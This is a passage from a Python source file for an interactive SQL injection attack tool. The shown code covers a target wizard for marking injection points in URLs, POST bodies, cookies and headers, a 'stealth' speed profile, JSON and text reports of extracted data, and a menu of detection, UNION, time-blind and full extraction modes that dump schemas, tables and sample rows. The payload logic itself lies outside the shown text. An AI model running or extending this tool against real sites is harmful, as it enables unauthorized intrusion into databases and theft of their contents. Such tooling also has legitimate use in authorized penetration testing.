        if saved_dbms and not self.st.dbms:
            self.st.dbms = saved_dbms
        self.stage_fingerprint()
        self.stage_union()
        self.stage_extract_mysql_error()
        self.stage_extract_blind_mysql()


# ── reporting ────────────────────────────────────────────────────────────────
def save_report(st: EngineState) -> str:
    data = {
        "url": st.url,
        "method": st.method,
        "dbms": st.dbms,
        "injectable": st.injectable,
        "union_cols": st.union_cols,
        "extracted": st.extracted,
        "findings": [asdict(f) for f in st.findings],
        "ts": datetime.now(timezone.utc).isoformat(),
    }
    path = save_json_report("sqli", data)
    lines = [
        f"url={st.url}",
        f"method={st.method}",
        f"dbms={st.dbms}",
        f"injectable={st.injectable}",
        f"union_cols={st.union_cols}",
        "",
        "--- extracted ---",
        json.dumps(st.extracted, indent=2, ensure_ascii=False, default=str),
        "",
        "--- findings ---",
    ]
    for f in st.findings:
        lines.append(f"[{f.severity}] {f.technique} {f.param} :: {f.payload[:80]}")
        if f.evidence:
            lines.append(f"    {f.evidence[:120]}")
    save_text_report("sqli", f"SQLi report — {st.url}", lines)
    return path


# ── interactive ──────────────────────────────────────────────────────────────
def ask_target() -> EngineState:
    """Interactive target wizard — method, URL, param pick, cookies/headers, profile."""
    print(f"  {C.FRAME}{C.B}┌── target wizard ──────────────────────────────┐{C.R}")

    # ── 1) method ────────────────────────────────────────────────────────────
    print(f"  {C.GOLD}[method]{C.R}")
    print(f"    1  GET")
    print(f"    2  POST")
    print(f"    3  GET + cookies")
    print(f"    4  POST + cookies")
    mc = prompt("  choose", "1")
    method = "POST" if mc in ("2", "4") else "GET"
    want_cookies = mc in ("3", "4")

    # ── 2) URL ───────────────────────────────────────────────────────────────
    print(f"  {C.GOLD}[url]{C.R}  mark inject point with *  e.g. ?id=1*  or  /item/1*")
    raw_url = prompt("  URL", "")
    star_param = None
    star_value = None
    if "*" in raw_url:
        # sqlmap-style: value ending with * is the injection point
        # e.g. http://t/?id=1*  or  http://t/?id=1*&x=2
        try:
            p = urlparse(raw_url.replace("*", "§STAR§"))
            qs = parse_qs(p.query, keep_blank_values=True)
            for k, vals in qs.items():
                for i, v in enumerate(vals):
                    if "§STAR§" in v:
                        star_param = k
                        star_value = v.replace("§STAR§", "")
                        qs[k][i] = star_value
            # rebuild without marker
            raw_url = urlunparse((p.scheme, p.netloc, p.path.replace("§STAR§", ""),
                                  p.params, urlencode(qs, doseq=True), p.fragment))
            status(f"inject marker on param '{star_param}' value='{star_value}'", "ok")
        except Exception:
            raw_url = raw_url.replace("*", "")
    url = normalize_url(raw_url)

    data: Dict[str, str] = {}
    if method == "POST":
        print(f"  {C.GOLD}[body]{C.R}  JSON {{\"id\":1}}  or  id=1&user=a")
        print(f"    mark with * in value if needed: id=1*")
        body_raw = prompt("  body", "id=1")
        if "*" in body_raw and star_param is None:
            # find marked field
            tmp = body_raw
            for part in body_raw.replace("{", "").replace("}", "").split("," if body_raw.strip().startswith("{") else "&"):
                pass
            data = parse_body(body_raw.replace("*", ""))
            # detect which key had *
            trial = parse_body(body_raw.replace("*", "§"))
            clean = parse_body(body_raw.replace("*", ""))
            for k, v in trial.items():
                if "§" in str(v):
                    star_param = k
                    star_value = clean.get(k, "1")
                    status(f"inject marker on POST param '{star_param}'", "ok")
                    break
            data = clean
        else:
            data = parse_body(body_raw.replace("*", ""))

    url, params, data = ensure_params(url, method, data)

    # ── 3) param selection ───────────────────────────────────────────────────
    print(f"  {C.GOLD}[params]{C.R}  discovered: {C.B}{', '.join(params) or '(none)'}{C.R}")
    print(f"    1  test ALL params")
    print(f"    2  pick by number")
    print(f"    3  type names (comma)")
    print(f"    4  common web set  (id,page,cat,uid,user,search,q,pid)")
    print(f"    5  numeric only    (id,uid,pid,page,cat,item,product)")
    if star_param:
        print(f"    6  marked only     ({star_param})")
    pc = prompt("  choose", "6" if star_param else "1")

    COMMON = ["id", "page", "cat", "uid", "user", "search", "q", "pid", "item", "product", "cid", "sid"]
    NUMERIC = ["id", "uid", "pid", "page", "cat", "item", "product", "cid", "sid", "order", "num"]

    if pc == "2":
        for i, name in enumerate(params, 1):
            print(f"    {C.NEON}{i}{C.R}  {name}")
        picks = prompt("  numbers (e.g. 1,3)", "1")
        chosen = []
        for tok in picks.split(","):
            tok = tok.strip()
            if tok.isdigit() and 1 <= int(tok) <= len(params):
                chosen.append(params[int(tok) - 1])
        params = chosen or params[:1]
    elif pc == "3":
        names = [x.strip() for x in prompt("  names", params[0] if params else "id").split(",") if x.strip()]
        # add missing into url/data
        for name in names:
            if name not in params:
                if method == "GET":
                    join = "&" if "?" in url else "?"
                    url = url + join + f"{name}=1"
                else:
                    data.setdefault(name, "1")
                params.append(name)
        params = [n for n in names if n in params or True]
        # rebuild unique
        seen = []
        for n in names:
            if n not in seen:
                seen.append(n)
        params = seen
    elif pc == "4":
        for name in COMMON:
            if name not in params:
                if method == "GET":
                    join = "&" if "?" in url else "?"
                    url = url + join + f"{name}=1"
                else:
                    data.setdefault(name, "1")
                params.append(name)
        params = [n for n in COMMON]
        status(f"using common set: {params}", "info")
    elif pc == "5":
        for name in NUMERIC:
            if name not in params:
                if method == "GET":
                    join = "&" if "?" in url else "?"
                    url = url + join + f"{name}=1"
                else:
                    data.setdefault(name, "1")
                params.append(name)
        params = list(NUMERIC)
        status(f"using numeric set: {params}", "info")
    elif pc == "6" and star_param:
        params = [star_param]
    else:
        # all — keep params as discovered
        pass

    # ── 4) cookies ───────────────────────────────────────────────────────────
    cookies: Dict[str, str] = {}
    if want_cookies or yn("  inject into cookies too?", False):
        print(f"  {C.GOLD}[cookies]{C.R}  format: name=value; name2=value2  (mark value with *)")
        raw = prompt("  cookie header", "")
        if raw:
            for part in raw.split(";"):
                part = part.strip()
                if not part:
                    continue
                if "=" in part:
                    k, v = part.split("=", 1)
                    k, v = k.strip(), v.strip()
                    if "*" in v:
                        v = v.replace("*", "")
                        star_c = f"cookie:{k}"
                        cookies[k] = v
                        if star_c not in params:
                            params.append(star_c)
                        status(f"cookie inject point: {k}", "ok")
                    else:
                        cookies[k] = v
                else:
                    cookies[part] = ""
            # also offer to test all cookies
            if cookies and yn("  test all cookie keys as inject points?", True):
                for k in cookies:
                    tag = f"cookie:{k}"
                    if tag not in params:
                        params.append(tag)

    # ── 5) custom headers ────────────────────────────────────────────────────
    headers: Dict[str, str] = {}
    if yn("  add custom headers / test header inject?", False):
        print(f"  {C.GOLD}[headers]{C.R}  one per line, empty line to finish")
        print(f"    e.g. X-Forwarded-For: 1*   or   User-Agent: test")
        while True:
            line = prompt("  header", "")
            if not line:
                break
            if ":" not in line:
                status("need Name: value", "warn")
                continue
            hk, hv = line.split(":", 1)
            hk, hv = hk.strip(), hv.strip()
            if "*" in hv:
                hv = hv.replace("*", "")
                headers[hk] = hv
                tag = f"header:{hk}"
                if tag not in params:
                    params.append(tag)
                status(f"header inject point: {hk}", "ok")
            else:
                headers[hk] = hv

    # ── 6) speed profile ─────────────────────────────────────────────────────
    print(f"  {C.GOLD}[profile]{C.R}")
    print(f"    1  fast     threads=12 delay=0.02 sleep=3  threshold=2.5")
    print(f"    2  normal   threads=6  delay=0.05 sleep=5  threshold=4.5")
    print(f"    3  stealth  threads=2  delay=0.4  sleep=6  threshold=5.0")
    print(f"    4  custom")
    pr = prompt("  choose", "2")
    profiles = {
        "1": (12, 0.02, 3, 2.5),
        "2": (6, 0.05, 5, 4.5),
        "3": (2, 0.4, 6, 5.0),
    }
    if pr in profiles:
        threads, delay, sleep_s, th = profiles[pr]
    else:
        threads = max(1, min(20, int(prompt("  threads", "6") or "6")))
        delay = float(prompt("  delay sec", "0.05") or "0.05")
        sleep_s = max(2, min(12, int(prompt("  time-blind sleep", "5") or "5")))
        th = float(prompt("  time threshold", "4.5") or "4.5")

    # ── summary ──────────────────────────────────────────────────────────────
    print(f"  {C.FRAME}└──────────────────────────────────────────────{C.R}")
    status(f"{method} {url}", "info")
    status(f"params → {params}", "info")
    if cookies:
        status(f"cookies → {list(cookies.keys())}", "info")
    if headers:
        status(f"headers → {list(headers.keys())}", "info")
    status(f"profile threads={threads} delay={delay} sleep={sleep_s}s thr={th}", "info")

    return EngineState(
        url=url, method=method, data=data, params=params,
        cookies=cookies, headers=headers,
        threads=threads, delay=delay, sleep_s=sleep_s, time_threshold=th,
    )


def print_summary(st: EngineState) -> None:
    print()
    status(f"findings={len(st.findings)} injectable={st.injectable} dbms={st.dbms or '?'}", "ok")
    if st.extracted:
        print(f"  {C.GOLD}{C.B}extracted:{C.R}")
        for k, v in st.extracted.items():
            if isinstance(v, (list, dict)):
                print(f"    {C.NEON}{k}{C.R}: {json.dumps(v, ensure_ascii=False)[:200]}")
            else:
                print(f"    {C.NEON}{k}{C.R}: {v}")
    if st.findings:
        path = save_report(st)
        status(f"saved {path}", "ok")


def run_menu_action(mode: str) -> None:
    banner()
    titles = {
        "full": "FULL PIPELINE — detect → fingerprint → union → extract",
        "detect": "DETECT ONLY — error / boolean / time",
        "extract": "EXTRACT — schema / tables / columns / sample rows",
        "union": "UNION — column count + version probe",
        "time": "TIME-BASED BLIND",
        "error": "ERROR-BASED DETECTION",
        "all": "ALL — every technique, multi-DBMS, extract + blind",
    }
    print(f"  {C.B}{titles.get(mode, mode)}{C.R}\n")
    st = ask_target()
    if not st.url:
        status("empty URL", "err")
        pause()
        return
    eng = SQLiEngine(st)
    try:
        if mode == "full":
            eng.run_full()
        elif mode == "detect":
            eng.run_detect_only()
        elif mode == "extract":
            eng.run_extract_only()
        elif mode == "union":
            eng.baseline()
            eng.stage_error_boolean()
            eng.stage_union()
        elif mode == "time":
            eng.baseline()
            eng.stage_time()
        elif mode == "error":
            eng.baseline()
            eng.stage_error_boolean()
            eng.stage_fingerprint()
        elif mode == "all":
            eng.run_all()
        else:
            eng.run_full()
    except KeyboardInterrupt:
        status("interrupted", "warn")
    print_summary(st)
    pause()


def run():
    while True:
        banner()
        box("SQLi Engine", [
            ("1", "Full pipeline (detect + fingerprint + extract)"),
            ("2", "Detect only (error / boolean / time)"),
            ("3", "Extract (schema / tables / columns / rows)"),
            ("4", "UNION column enum + version"),
            ("5", "Time-based blind only"),
            ("6", "Error-based only"),
            ("7", "ALL — every technique (aggressive)"),
            ("0", "Back"),
        ])
        c = prompt(">>", "0")
        if c == "0":
            return
        elif c == "1":
            run_menu_action("full")
        elif c == "2":
            run_menu_action("detect")
        elif c == "3":
            run_menu_action("extract")
        elif c == "4":
            run_menu_action("union")
        elif c == "5":
            run_menu_action("time")
        elif c == "6":
            run_menu_action("error")
        elif c == "7":
            run_menu_action("all")
        else:
            status("invalid", "err")
            time.sleep(0.4)


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{C.CRIM}bye{C.R}")
